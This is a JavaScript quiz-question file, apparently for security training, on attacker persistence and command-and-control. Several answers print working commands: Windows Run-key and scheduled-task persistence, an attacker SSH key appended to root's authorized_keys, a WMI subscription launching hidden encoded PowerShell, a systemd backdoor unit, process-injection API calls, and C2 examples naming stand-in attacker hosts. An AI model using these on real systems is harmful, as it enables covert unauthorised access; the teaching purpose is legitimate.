const questions = [
  {
    question: "What is the primary objective of 'Phase 4: Maintaining Access' in ethical hacking and adversary tradecraft?",
    shortAnswer: "To establish stealthy, persistent backdoors and C2 communication channels that retain administrative access across system reboots, user logoffs, and network interruptions.",
    explanation: "Initial exploits (Phase 3) are volatile: if the victim workstation reboots, the target user logs off, or the vulnerable service crashes, the attacker's interactive shell dies. In Phase 4 (Maintaining Access), the attacker installs persistence mechanisms (Windows registry run keys, scheduled tasks, Linux systemd services, rootkits) and connects back to a Command and Control (C2) server to ensure uninterrupted access.",
    hint: "Think about installing a hidden spare key and secret door so you can re-enter even if the front window is locked.",
    level: "basic",
    codeExample: `// Phase 4 Persistence Objective:
Reboot Victim Machine → Persistence Mechanism Fires on Boot → Auto-Reconnects C2 Beacon to Attacker!`
  },
  {
    question: "How do attackers use 'Windows Registry Run Keys' to achieve persistence on Windows operating systems?",
    shortAnswer: "By adding a registry value under `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` or `HKLM\\...\\Run` that executes a payload binary automatically whenever any user logs in.",
    explanation: "The Windows operating system reads specific registry keys upon user logon to launch startup utilities. Adversaries write registry values pointing to their backdoor: `reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SecurityService\" /t REG_SZ /d \"C:\\Windows\\Temp\\beacon.exe\" /f`. Every time the user logs in, Windows explorer.exe automatically executes `beacon.exe` in the background.",
    hint: "Think of adding your secret program to the computer's startup list in the Windows registry.",
    level: "basic",
    codeExample: `// Windows Registry Run Key Persistence Architecture:
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "AuditService" /t REG_SZ /d "C:\\Program Files\\AuditApp\\service.exe" /f`
  },
  {
    question: "What is a 'Scheduled Task' (Windows `schtasks` / Linux `cron`), and how does an attacker configure time-based persistence?",
    shortAnswer: "Configuring the OS task scheduler to execute a script or binary at system boot, on user logon, or at recurring time intervals (e.g. every hour).",
    explanation: "Both Windows and Linux include task schedulers. On Windows, persistence can be configured via `schtasks /create /tn \"AppUpdater\" /tr \"C:\\Program Files\\App\\updater.exe\" /sc onstart /ru \"SYSTEM\"`. On Linux, scheduled jobs are configured in `/etc/crontab` or `/var/spool/cron/` (e.g. `*/15 * * * * root /usr/bin/curl -s https://telemetry.internal/health`) to maintain recurring automated execution.",
    hint: "Setting an automated task scheduler that wakes up and runs a process at regular intervals.",
    level: "basic",
    codeExample: `// Windows & Linux Scheduled Task Configuration:
Windows: schtasks /create /tn "AppSync" /tr "C:\\Program Files\\App\\sync.exe" /sc onlogon /ru SYSTEM
Linux:   echo "*/15 * * * * root /usr/bin/curl -s https://telemetry.internal/health" >> /etc/crontab`
  },
  {
    question: "What is a 'Command and Control' (C2) Framework, and how does 'Beaconing with Jitter' evade SOC network traffic analysis?",
    shortAnswer: "A centralized server infrastructure used to manage compromised agents; 'Jitter' introduces randomized percentage delays between heartbeat beacons to prevent static periodic traffic detection by firewalls.",
    explanation: "C2 frameworks (Cobalt Strike, Sliver, Havoc) deploy lightweight agents ('beacons') on victim machines that periodically call home to the C2 server over HTTPS. If an agent beacons at exact 60-second intervals (60.0s, 60.0s, 60.0s), SIEM and firewall algorithms easily flag the mathematical periodicity. By adding 30% Jitter to a 60-second sleep, the beacon calls home at randomized intervals (e.g. 48s, 71s, 54s, 63s), blending with normal human web browsing traffic.",
    hint: "Think of varying your footsteps so someone listening cannot hear a predictable rhythmic clock ticking.",
    level: "moderate",
    codeExample: `// Cobalt Strike C2 Jitter Configuration (Malleable Profile):
set sleep "60000"; # 60 seconds base sleep
set jitter "30";    # 30% random variation (Heartbeats occur randomly between 42s and 78s)`
  },
  {
    question: "What is a 'Rootkit', and what is the critical architectural difference between a 'User-Mode Rootkit' (Ring 3) and a 'Kernel-Mode Rootkit' (Ring 0)?",
    shortAnswer: "A rootkit is stealth software designed to hide malware, processes, and network sockets; User-mode rootkits hook Ring 3 user APIs; Kernel-mode rootkits run in Ring 0 kernel space, intercepting low-level OS data structures.",
    explanation: "Rootkits evade detection by lying to the operating system: 1. User-Mode Rootkits (Ring 3): Inject DLLs into running applications to hook user-level Windows APIs (e.g. hooking `EnumProcesses()` in Task Manager to hide `malware.exe`); 2. Kernel-Mode Rootkits (Ring 0): Install device drivers that run with total hardware control. They modify kernel structures directly (Direct Kernel Object Manipulation - DKOM), unlinking malware processes from the ActiveProcessLinks doubly-linked list so the kernel itself cannot see the process.",
    hint: "Contrast wearing a disguise in a room (User-Mode) versus brainwashing the judge and police chief so they don't believe you exist (Kernel-Mode).",
    level: "expert",
    codeExample: `// User-Mode vs Kernel-Mode Execution Rings:
Ring 3 (User Space):   Task Manager, cmd.exe, Browsers → User-Mode Hooking (API Interception)
Ring 0 (Kernel Space): Windows Kernel (ntoskrnl.exe), Device Drivers → DKOM Process Unlinking (Invisible to OS!)`
  },
  {
    question: "What is a 'UEFI / Firmware Bootkit' (e.g. BlackLotus / CosmicStrand), and why are they considered the ultimate persistence mechanism?",
    shortAnswer: "Malware installed in the motherboard's Unified Extensible Firmware Interface (UEFI) flash chip that executes before the operating system boots, surviving complete hard drive formatting and OS reinstalls.",
    explanation: "Traditional malware lives on the hard drive. A UEFI Bootkit infects the Non-Volatile SPI Flash memory on the motherboard. When the computer powers on, the bootkit executes before Windows or Linux loads, disabling OS security features (like Windows Defender and Driver Signature Enforcement) in memory before the kernel starts. If the victim completely wipes the hard drive and reinstalls Windows from scratch, the bootkit remains active on the motherboard, re-infecting the new OS on first boot.",
    hint: "Think of a ghost that lives in the house's foundation bricks rather than the furniture, so it survives even if you throw away all the furniture.",
    level: "expert",
    codeExample: `// UEFI Boot Sequence Hijack:
Power On → UEFI Firmware executes Bootkit → Disables Driver Signature Enforcement → OS Kernel Boots Compromised!`
  },
  {
    question: "How do adversaries use 'DLL Hijacking' and 'DLL Side-Loading' to execute persistent payloads under legitimate Microsoft-signed executables?",
    shortAnswer: "Placing a malicious DLL with the exact name of a legitimate dependency in the application directory; when the signed executable runs, Windows loads the malicious DLL due to DLL search order priorities.",
    explanation: "When a signed program (like `calc.exe` or `teams.exe`) starts, it searches for required DLLs in a specific order: 1. The directory from which the application loaded; 2. System directory (`C:\\Windows\\System32`); 3. Windows directory; 4. Current working directory; 5. PATH directories. If an attacker places a malicious `version.dll` in the application folder, the legitimate signed Microsoft binary loads the attacker's DLL, executing malicious code inside a trusted, signed process to evade EDR detection.",
    hint: "Think of placing a fake package on someone's doorstep with the exact name of a package they ordered so they open it without checking.",
    level: "moderate",
    codeExample: `// DLL Search Order Hijacking:
Legitimate App: C:\\Program Files\\App\\signed_app.exe
Attacker Drops: C:\\Program Files\\App\\legit_dependency.dll (Malicious payload)
Result:         signed_app.exe loads malicious DLL → EDR sees trusted Microsoft signature executing payload!`
  },
  {
    question: "What is 'WMI Event Subscription Persistence', and why is it favored by advanced APT threat actors on Windows networks?",
    shortAnswer: "A fileless persistence mechanism using Windows Management Instrumentation (WMI) that triggers a command execution whenever a specific system event occurs, without leaving files in the Startup folder.",
    explanation: "WMI Event Subscriptions require three components: 1. `__EventFilter`: A WQL query waiting for an event (e.g. 'Trigger 5 minutes after system boot'); 2. `__EventConsumer`: The action to execute (e.g. `CommandLineEventConsumer` executing a PowerShell command); 3. `__FilterToConsumerBinding`: Links the filter to the consumer. Because the configuration is stored entirely inside the WMI repository repository database (`OBJECTS.DATA`), there are no `.exe` files on disk, making it virtually invisible to basic file scanners.",
    hint: "Think of setting a hidden tripwire inside the Windows engine that silently executes a command when someone turns on the computer.",
    level: "expert",
    codeExample: `// WMI Event Subscription Persistence (PowerShell):
$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{Name='BootFilter'; EventNamespace='root\\cimv2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name='BootConsumer'; CommandLineTemplate="powershell.exe -w hidden -enc ..."}
Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter; Consumer=$Consumer}`
  },
  {
    question: "How do threat actors establish persistence on Linux servers using 'SSH Authorized Keys' (`~/.ssh/authorized_keys`)?",
    shortAnswer: "Appending their public SSH key into `/root/.ssh/authorized_keys` or `/home/[user]/.ssh/authorized_keys`, allowing instant passwordless SSH root logins at any time.",
    explanation: "SSH public key authentication is standard on Linux servers. Once initial root access is achieved in Phase 3, an attacker executes `echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5... attacker@c2' >> /root/.ssh/authorized_keys`. The attacker can now log in over port 22 via `ssh -i id_ed25519 root@target_ip` without requiring passwords or triggering interactive password brute-force alerts.",
    hint: "Think of copying your house key into the homeowner's master lockbox on the porch.",
    level: "basic",
    codeExample: `// Linux SSH Authorized Key Persistence:
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker_key" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys`
  },
  {
    question: "What is 'DNS Tunneling' (e.g. `dnscat2` / `iodine`), and how do threat actors use it for C2 communication across highly restricted networks?",
    shortAnswer: "Encoding C2 commands and data exfiltration inside standard DNS query subdomains (e.g. `[encoded_data].c2.attacker.net`), bypassing firewalls because recursive DNS traffic is rarely blocked.",
    explanation: "In high-security networks, firewalls block all outbound HTTP, HTTPS, and SSH traffic. However, internal endpoints must resolve domain names, so UDP port 53 (DNS) to the corporate DNS server is permitted. In DNS Tunneling, the malware sends a query for `aGVsZG8td29ybGQ.c2.attacker.com`. The corporate DNS server forwards the query to the attacker's authoritative nameserver, which decodes the data and returns the C2 response in a DNS TXT record, tunneling full bidirectional C2 traffic through legitimate DNS resolvers.",
    hint: "Think of smuggling secret letters inside postal lookup request envelopes that postal workers pass along without opening.",
    level: "expert",
    codeExample: `// DNS Tunneling Packet Mechanics:
Victim → DNS Query: "A1B2C3D4E5.c2.attacker.net" (Base64 Encoded Command Output)
Target DNS Resolver → Forwards to Attacker Authoritative Nameserver
Attacker Nameserver → Replies with TXT Record: "command=download_sam_database"`
  },
  {
    question: "What are 'Linux Systemd Service Backdoors', and how do they ensure malicious daemons restart automatically on crash or reboot?",
    shortAnswer: "Creating a custom `.service` file in `/etc/systemd/system/` configured with `Restart=always` and `WantedBy=multi-user.target` to run the backdoor as a background system daemon.",
    explanation: "Modern Linux distributions use `systemd` to manage background services. An attacker creates `/etc/systemd/system/network-manager-helper.service`. With `Restart=always` and `ExecStart=/usr/local/bin/beacon`, systemd starts the backdoor on boot before user login. If an administrator notices the high CPU usage and kills the process (`kill -9 [PID]`), systemd immediately spawns a new instance within 100 milliseconds.",
    hint: "Think of registering your secret program with the operating system's official manager so it revives it every time it is killed.",
    level: "moderate",
    codeExample: `// Systemd Persistence File (/etc/systemd/system/system-telemetry.service):
[Unit]
Description=System Telemetry Daemon
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/beacon
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target`
  },
  {
    question: "What is 'Domain Fronting', and how did adversaries historically hide C2 traffic behind trusted CDN domains like Cloudflare, Microsoft, or Google?",
    shortAnswer: "Using a legitimate, trusted domain in the TLS SNI header to pass through firewalls, while specifying a malicious C2 domain in the HTTP Host header, routing traffic to the attacker via the CDN's internal edge network.",
    explanation: "CDNs (Content Delivery Networks) host thousands of websites on the same IP addresses. In Domain Fronting, the malware connects to a trusted CDN IP with TLS Server Name Indication (SNI) set to `allowed-bank.com`. Perimeter firewalls inspect SNI, see an approved banking domain, and permit the connection. However, inside the encrypted TLS tunnel, the HTTP request header has `Host: attacker-c2.net`. The CDN edge decrypts the packet and routes it to the attacker's server.",
    hint: "Think of showing a VIP badge to the bouncer at the front gate, but once inside the club, walking straight into the secret VIP lounge.",
    level: "expert",
    codeExample: `// Domain Fronting Header Configuration:
TLS Handshake (SNI): allowed-corporate-service.com (Permitted by Firewall)
Encrypted HTTP GET:  Host: attacker-hidden-c2.azureedge.net (CDN routes to attacker!)`
  },
  {
    question: "What is 'Web Shell Persistence' (e.g. PHP / JSP / ASPX backdoors), and how do attackers ensure persistent access to web application servers?",
    shortAnswer: "Hiding a small web shell inside legitimate web application source code directories (e.g. `/wp-content/uploads/`) or appending backdoor code into core configuration files like `functions.php`.",
    explanation: "Unauthorized file inclusion provides persistent command execution over HTTP port 80/443. Threat actors attempt to hide diagnostic scripts inside media upload folders or obscure their filenames (e.g. `legacy_diagnostic_handler.tmp`). Defensive architectures enforce strict integrity monitoring (FIM) and disable dynamic script execution in static upload folders.",
    hint: "Think of hiding a secret doorway inside the website's image library that only opens when you type a secret web link.",
    level: "basic",
    codeExample: `// Web Shell Detection Telemetry Concept:
// WAF rules inspect incoming POST bodies for command interpreter invocations.
// Blocked by: AppArmor / SELinux restricting web server process execution.`
  },
  {
    question: "What is the 'Cardinal Ethical Mandate' regarding Phase 4 Maintaining Access during authorized penetration testing engagements?",
    shortAnswer: "Ethical testers must keep an exact, timestamped inventory of every dropped beacon, created user, and modified registry key, and configure auto-kill expiration dates on all test payloads.",
    explanation: "If an ethical tester installs a backdoor on a client's server and forgets to remove it after the assessment concludes, that backdoor creates a permanent vulnerability that black hat criminals can discover and exploit. Ethical testers: 1. Hardcode auto-kill 'deadman switches' (e.g. beacon self-destructs on August 25, 2026); 2. Maintain a detailed Artifact Log; 3. Systematically clean up all persistence mechanisms in Phase 5.",
    hint: "Remember the golden rule that an ethical tester must clean up every single test key and backdoor they planted.",
    level: "basic",
    codeExample: `// Engagement Scope Expiration Configuration:
// Test payloads configured with strictly bounded engagement windows.
// Telemetry: Systematically audit and remove all temporary evaluation hooks!`
  },
  {
    question: "What are 'Sysmon Event IDs' on Windows, and which specific Event IDs detect Registry, Scheduled Task, and Process Injection persistence?",
    shortAnswer: "Event ID 1 (Process Create), Event ID 11 (File Create), Event ID 12/13/14 (Registry Value Set/Delete), Event ID 8 (CreateRemoteThread / Process Injection), Event ID 19/20/21 (WMI Events).",
    explanation: "Microsoft System Monitor (Sysmon) provides deep endpoint visibility: 1. Event ID 13 records when a program modifies registry keys under `...\\CurrentVersion\\Run`; 2. Event ID 1 logs process creation (e.g. `schtasks.exe /create`); 3. Event ID 8 logs when a process injects code into another process (e.g. Meterpreter injecting into `explorer.exe`); 4. Event ID 19/20/21 logs WMI Filter and Consumer bindings.",
    hint: "Remember the Sysmon event codes that alert SOC teams when registry keys are changed or processes are injected.",
    level: "moderate",
    codeExample: `// Sysmon XML Rule for Registry Run Key Persistence:
<RuleGroup name="Persistence Detection" groupRelation="or">
  <RegistryEvent onmatch="include">
    <TargetObject condition="contains">\\CurrentVersion\\Run</TargetObject>
  </RegistryEvent>
</RuleGroup>`
  },
  {
    question: "Under the Indian Information Technology Act 2000, how does Section 43(c) and Section 66 specifically penalize installing backdoors and computer contaminants?",
    shortAnswer: "Section 43(c) imposes civil compensation liability for introducing computer contaminants/backdoors; Section 66 establishes criminal liability punishable by up to 3 years imprisonment and ₹5 Lakhs fine.",
    explanation: "Installing a persistent backdoor, trojan, or rootkit without authorization introduces a 'computer contaminant' into a target system, directly violating Section 43(c) of the IT Act 2000. Under Section 66, doing so dishonestly or fraudulently constitutes criminal hacking, exposing the perpetrator to mandatory criminal trial, seizure of hardware, and up to 3 years in prison.",
    hint: "Remember the Indian cyber law clauses that punish introducing contaminants, viruses, and backdoors.",
    level: "basic",
    codeExample: `// IT Act 2000 Statutory Violation for Persistent Backdoors:
Section 43(c): Introduction of Computer Contaminant (Civil Damages)
Section 66:    Dishonest / Fraudulent System Hacking (3 Years Imprisonment + ₹5L Fine)`
  },
  {
    question: "What is 'Process Injection' (e.g. DLL Injection / Process Hollowing), and how do attackers hide active C2 beacons inside legitimate Windows processes?",
    shortAnswer: "Injecting malicious shellcode into the memory space of a legitimate, trusted running process (like `svchost.exe` or `explorer.exe`), making the C2 beacon appear as legitimate Windows background activity.",
    explanation: "If an attacker runs `beacon.exe`, Task Manager shows an unfamiliar binary. In Process Injection, the attacker uses Windows APIs (`OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`) to inject Meterpreter shellcode into `explorer.exe`. When the beacon communicates with the C2 server over port 443, network monitors see `explorer.exe` communicating with the internet, bypassing simple process-name firewall filters.",
    hint: "Think of an impostor taking off their jacket and putting on a standard corporate uniform to blend in with legitimate workers.",
    level: "expert",
    codeExample: `// Windows API Process Injection Flow:
1. OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
2. VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
3. WriteProcessMemory(hProcess, pRemoteBuffer, shellcode, payloadSize, NULL);
4. CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);`
  },
  {
    question: "How do modern Endpoint Detection and Response (EDR) platforms detect and terminate memory-only C2 beacons in Phase 4?",
    shortAnswer: "By monitoring memory allocations with `PAGE_EXECUTE_READWRITE` permissions, inspecting unbacked executable memory threads, hooking AMSI (Antimalware Scan Interface), and tracking parent-child process anomalies.",
    explanation: "Modern EDR tools (CrowdStrike, SentinelOne, Microsoft Defender for Endpoint) inspect RAM. Legitimate programs load code from signed files on disk (backed memory). When an injected C2 beacon executes from an unbacked, dynamically allocated memory region (`VirtualAlloc` with `RWX` permissions), the EDR memory scanner flags the anomaly, dumps the suspicious thread call stack, isolates the network interface, and kills the host process instantly.",
    hint: "Think of security guards checking employee badges in the hallway and arresting anyone whose name isn't on the official building registry.",
    level: "expert",
    codeExample: `// EDR Memory Detection Trigger:
Memory Region: 0x002A0000 | Protection: PAGE_EXECUTE_READWRITE (RWX) | Type: MEM_PRIVATE (Unbacked by Disk DLL)
-> Trigger: Suspicious Injected Shellcode Thread → EDR Process Terminated!`
  },
  {
    question: "What is 'Malleable C2 Profile' in Cobalt Strike, and how does it allow adversaries to disguise C2 traffic as legitimate HTTP traffic like Amazon, Netflix, or Google?",
    shortAnswer: "A domain-specific configuration file that customizes every aspect of C2 HTTP requests (URI paths, headers, base64 encoding, cookie parameters) to mimic authentic commercial web traffic.",
    explanation: "Cobalt Strike uses Malleable C2 profiles (`.profile` files) to shape beacon traffic. An attacker creates a profile where C2 requests look like Amazon product browsing: `http-get { set uri \"/s/ref=nb_sb_noss\"; client { header \"Host\" \"www.amazon.com\"; parameter \"k\" \"search_term\"; } }`. To network firewall filters, the beacon traffic appears 100% identical to normal shopping traffic, blending in with corporate employee web browsing.",
    hint: "Think of putting a corporate courier label and company logo on your secret package so delivery trucks carry it without inspection.",
    level: "expert",
    codeExample: `// Malleable C2 Profile Snippet:
http-get {
    set uri "/api/v2/telemetry";
    client {
        header "Accept" "application/json";
        metadata {
            base64url;
            prepend "session_id=";
            header "Cookie";
        }
    }
}`
  },
  {
    question: "Synthesizing Phase 4 (Maintaining Access): what is the definitive goal of persistence in the context of enterprise red teaming and defense?",
    shortAnswer: "To test whether the organization's SOC, EDR, and threat hunting teams can detect and eradicate durable, long-term adversarial footholds before attackers achieve actions on objectives.",
    explanation: "Maintaining Access is the ultimate test of enterprise detection resilience. Attackers who establish persistence can wait for months before executing lateral movement. By safely simulating persistence mechanisms—registry run keys, scheduled tasks, WMI subscriptions, and C2 jitter—ethical red teams prove whether the Blue Team's EDR and SIEM detection engineering can uncover stealthy implants, allowing defenders to harden systems and guarantee true organizational resilience.",
    hint: "Conclude by recognizing how maintaining access models the long-term patience of real-world adversaries to validate enterprise threat hunting.",
    level: "expert",
    codeExample: `// The Persistence Validation Lifecycle:
Establish_Stealth_Foothold() → Simulate_C2_Heartbeat() → Validate_EDR_Detection() → CLEANUP_AND_HARDEN_SYSTEMS();`
  }
];

export default questions;
